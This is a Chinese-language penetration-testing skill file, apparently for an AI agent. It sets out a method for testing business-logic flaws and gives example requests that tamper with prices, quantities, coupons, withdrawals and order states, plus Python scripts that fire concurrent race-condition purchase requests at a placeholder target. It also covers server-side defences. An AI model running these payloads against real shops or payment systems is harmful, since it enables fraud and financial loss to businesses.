---
name: business-logic-testing
description: 业务逻辑漏洞测试的专业技能和方法论
version: 1.0.0
---

# 业务逻辑漏洞测试

## 概述

业务逻辑漏洞是应用程序在业务处理流程中的设计缺陷，可能导致未授权操作、数据篡改、资金损失等。本技能提供业务逻辑漏洞的检测、利用和防护方法。

## 漏洞类型

### 1. 工作流绕过

**跳过验证步骤：**
- 直接访问最终步骤
- 修改步骤顺序
- 重复执行步骤

### 2. 价格操作

**负数价格：**
- 输入负数金额
- 导致账户余额增加

**价格篡改：**
- 修改前端价格
- 修改API请求中的价格

### 3. 数量限制绕过

**负数数量：**
- 输入负数
- 可能导致库存增加

**超出限制：**
- 修改数量限制
- 批量操作绕过

### 4. 时间竞争

**并发请求：**
- 同时发送多个请求
- 绕过单次限制

### 5. 状态操作

**状态回退：**
- 将已完成订单改为待支付
- 修改订单状态

## 测试方法

### 1. 工作流分析

**识别业务流程：**
- 注册流程
- 购买流程
- 提现流程
- 审核流程

**测试步骤跳过：**
```
正常流程: 步骤1 → 步骤2 → 步骤3
测试: 直接访问步骤3
测试: 步骤1 → 步骤3（跳过步骤2）
```

### 2. 参数篡改

**修改关键参数：**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # 修改为 0.01
}
```

**负数测试：**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. 并发测试

**同时发送请求：**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

# 同时发送10个请求
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. 状态修改

**修改订单状态：**
```http
PATCH /api/order/123
{
  "status": "completed"  # 修改为已完成
}
```

**回退状态：**
```http
PATCH /api/order/123
{
  "status": "pending"  # 从已完成回退到待支付
}
```

## 利用技术

### 价格操作

**负数价格：**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**修改前端价格：**
```javascript
// 前端代码
const price = 100.00;

// 修改为
const price = 0.01;
```

**API价格修改：**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # 原价100.00
      "quantity": 1
    }
  ]
}
```

### 数量限制绕过

**负数数量：**
```json
{
  "product_id": 123,
  "quantity": -10  # 可能导致库存增加
}
```

**超出限制：**
```json
{
  "product_id": 123,
  "quantity": 999999  # 超出单次购买限制
}
```

### 优惠券滥用

**重复使用：**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# 重复使用同一优惠券
```

**未激活优惠券：**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # 使用过期优惠券
  "items": [...]
}
```

### 提现漏洞

**负数提现：**
```json
{
  "amount": -1000.00  # 可能导致账户余额增加
}
```

**超出余额：**
```json
{
  "amount": 999999.00  # 超出账户余额
}
```

### 时间竞争

**并发购买：**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# 限时抢购，并发请求
for i in range(100):
    threading.Thread(target=buy).start()
```

## 绕过技术

### 前端验证绕过

**直接调用API：**
- 绕过前端JavaScript验证
- 直接发送API请求

**修改请求：**
- 使用Burp Suite拦截
- 修改参数后发送

### 状态码分析

**观察响应：**
- 200 OK - 可能成功
- 400 Bad Request - 参数错误
- 403 Forbidden - 权限不足
- 500 Internal Server Error - 服务器错误

### 错误信息利用

**从错误信息获取信息：**
```
错误: "余额不足，当前余额: 100.00"
→ 可以获取账户余额信息
```

## 工具使用

### Burp Suite

**使用Repeater：**
1. 拦截业务请求
2. 修改关键参数
3. 观察响应

**使用Intruder：**
1. 标记参数
2. 使用Payload列表
3. 批量测试

### 自定义脚本

```python
import requests
import json

def test_price_manipulation():
    # 测试价格修改
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## 验证和报告

### 验证步骤

1. 确认可以绕过业务逻辑限制
2. 验证可以执行未授权操作
3. 评估影响（资金损失、数据篡改等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和业务流程
- 可执行的未授权操作
- 完整的利用步骤和PoC
- 修复建议（服务端验证、业务规则检查等）

## 防护措施

### 推荐方案

1. **服务端验证**
   ```python
   def process_purchase(product_id, quantity, price):
       # 从数据库获取真实价格
       real_price = db.get_product_price(product_id)
       
       # 验证价格
       if price != real_price:
           raise ValueError("Price mismatch")
       
       # 验证数量
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
       # 处理购买
       process_order(product_id, quantity, real_price)
   ```

2. **状态机验证**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **并发控制**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
           # 检查订单状态
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
           # 处理订单
           process(order)
   ```

4. **业务规则验证**
   ```python
   def validate_business_rules(order):
       # 验证数量限制
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
       # 验证价格范围
       if order.price <= 0:
           raise ValueError("Invalid price")
       
       # 验证库存
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **审计日志**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## 注意事项

- 仅在授权测试环境中进行
- 避免对业务造成实际影响
- 注意不同业务流程的差异
- 测试时注意数据一致性